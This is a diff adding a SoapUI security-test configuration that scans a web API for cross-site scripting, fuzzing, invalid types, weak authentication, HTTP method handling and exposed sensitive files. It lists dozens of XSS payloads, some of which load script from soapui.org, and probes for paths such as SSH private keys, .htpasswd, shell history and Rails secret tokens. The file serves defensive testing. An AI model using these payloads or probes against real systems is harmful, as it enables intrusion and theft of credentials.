+        <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="2740f2f6-f861-457d-b175-59b8cddd5ddc" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="CrosSiteScript" id="4f81f529-adab-40cd-93de-7f00856949ef" name="Cross Site Scripting Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="lon" parameterName="lon" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="2364c25d-e2b7-4ad1-b375-fa1999c93ed1" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:FuzzerScan">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="7bc7f467-30d1-4045-b83b-3db087d99e20" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="lon" parameterName="lon" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+        <con:parameters label="lat" parameterName="lat" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" immutable="true">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="02292c75-0d2a-4cbf-a87f-eef2723f67a6" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:InvalidSecurityScan">
+        <con:typesList>
+          <con:type>3</con:type>
+          <con:value>true</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>4</con:type>
+          <con:value>GpM7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>5</con:type>
+          <con:value>0FB7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>9</con:type>
+          <con:value>-1E4f</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>10</con:type>
+          <con:value>12.45E+12</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>11</con:type>
+          <con:value>-1.23</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>12</con:type>
+          <con:value>SoapUI is	 the
+ best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>13</con:type>
+          <con:value>P1Y2M3DT10H30M12.3S</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>14</con:type>
+          <con:value>1999-05-31T13:20:00.000-05:00</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>16</con:type>
+          <con:value>1999-05-31</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>22</con:type>
+          <con:value>-1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>23</con:type>
+          <con:value>-882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>24</con:type>
+          <con:value>-2147483647</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>25</con:type>
+          <con:value>-32768</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>26</con:type>
+          <con:value>127</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>27</con:type>
+          <con:value>0</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>28</con:type>
+          <con:value>-1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>29</con:type>
+          <con:value>1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>30</con:type>
+          <con:value>1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>31</con:type>
+          <con:value>882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>32</con:type>
+          <con:value>294967295</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>33</con:type>
+          <con:value>65535</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>34</con:type>
+          <con:value>255</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>35</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>36</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="e5c11c26-ee5c-42e3-aa52-c8094a2d9b55" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="lon" parameterName="lon" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+        <con:parameters label="lat" parameterName="lat" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="3d11ccdd-9571-4883-a83a-134bc338b7ac" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:SensitiveFileSecurityScan">
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
+      </con:config>
+      <con:assertion type="Sensitive Files Exposure Assertion" id="d055db8c-f8f3-47ab-82bc-d3331f8572d3" name="Sensitive Files Exposure"/>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true"/>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="65585c8e-202f-4a48-af0a-6a90f8e9014c" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:nil="true"/>
+      <con:assertion type="WeakPassword" id="1228a2d3-bd0a-4ed8-88f7-23e6b1ba60ff" name="Weak Password Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="BasicAuth" id="1abb2297-846e-4b77-8a01-3b42d3089406" name="Basic Authentication Detection"/>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true"/>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="57c1e626-9537-490d-b2af-6885f73d7a21" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:HttpMethodFuzzingScan">
+        <con:deselectedMethods/>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="2e0c7964-ee4a-44ca-9167-c661fb0e5b10" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Valid HTTP Status Codes" id="a44fe158-954b-45d9-85c6-f6f3ad3b86bd" name="Valid HTTP Status Codes">
+        <con:settings>
+          <con:setting id="__LEVEL_">WARNING</con:setting>
+        </con:settings>
+        <con:configuration>
+          <codes>501,405,403</codes>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true"/>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+  </con:testStepSecurityTest>
+  <con:properties/>
+  <con:reportParameters/>
+</con:securityTest>
